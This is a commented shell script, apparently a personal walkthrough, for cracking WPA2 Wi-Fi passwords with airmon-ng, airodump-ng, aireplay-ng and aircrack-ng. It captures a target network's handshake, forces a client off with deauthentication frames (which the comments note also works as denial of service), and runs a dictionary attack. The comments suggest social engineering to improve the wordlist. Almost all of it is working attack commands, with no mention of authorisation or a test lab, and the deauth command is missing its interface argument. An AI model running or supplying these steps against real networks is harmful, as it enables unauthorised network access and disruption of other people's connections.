#Code for WPA2 cracking
#First check that the wireless NIC is being recognised
iwconfig
#Turn on the monitor mode
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
#Checking wireless netwroks available 
airodump-ng wlan0
#After the above command is run for a couple seconds, Quit execution
#Now, choose the network to be targetted and execute following command to lock onto it
airodump-ng -c10 -w Captured-packets -d 9C:53:22:7D:D7:DD wlan0
#The -c10 means the channel of the network
#-w and the name tells where the packets are to be stored
#9C:53:22:7D:D7:DD is the BSSID of the network
#If a device connects to the network then the handshake will be captured
#Alternatively, we can deauthenticate a particular user on the network and force them to reconnect thus capturing the handshake
aireplay-ng --deauth 0 -a 9C:53:22:7D:D7:DD -c 6A:4D:04:C5:36:7B
#9C:53:22:7D:D7:DD is the network BSSID
#6A:4D:04:C5:36:7B is the device connected to the network
#The above command can also be used for a denial of service attack
#Now, the handshake will be captured and a offline dictionary attack can be used to determine the password
aircrack-ng Captured-packets.cap -w passwords.txt
#The above command uses a txt file containing a very large amount of common passwords
#When the hash is cracked using a particular password, we get the result as that password
#The password list can also be improved using social engineering imporving the chances of cracking
#Thus, WPA2 has been cracked successfully
